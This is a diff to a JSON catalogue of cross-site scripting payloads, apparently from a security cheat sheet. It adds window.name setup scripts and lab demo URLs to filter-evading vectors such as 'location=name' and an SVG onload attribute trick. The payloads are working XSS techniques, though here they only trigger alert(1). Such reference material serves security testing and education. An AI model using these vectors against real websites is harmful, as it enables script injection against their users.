@@ -69,7 +69,7 @@
   },
   {
     "description": "No parentheses using location redirect no strings",
-    "code": "<script>location=name</script>",
+    "code": "<script>window.name='alert(1)';</script><script>location=name</script>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
@@ -261,7 +261,7 @@
   },
   {
     "description": "Attributes and SVG with payload concealed in window name",
-    "code": "<svg onload=\"attributes[0].value=name,new onload\">",
+    "code": "<script>window.name='alert(1)';</script><svg onload=\"attributes[0].value=name,new onload\">",
     "browsers": ["chrome", "firefox", "safari", "edge"]
   },
   {
@@ -554,13 +554,13 @@
     "description": "location=name (js_string_single)",
     "code": "'-[location=name]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "context": "js_string_single"
+    "url": "https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src=https://portswigger-labs.net/xss/xss.php?x=%27-[location=name]-%27%26context=js_string_single%20name=javascript:alert(1)%3E%3C/script%3E"
   },
   {
     "description": "location.href=name (js_string_single)",
     "code": "'-[location.href=name]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "context": "js_string_single"
+    "url": "https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src=https://portswigger-labs.net/xss/xss.php?x=%27-[location.href=name]-%27%26context=js_string_single%20name=javascript:alert(1)%3E%3C/script%3E"
   },
   {
     "description": "location=javascript: %XX paren (js_string_single)",
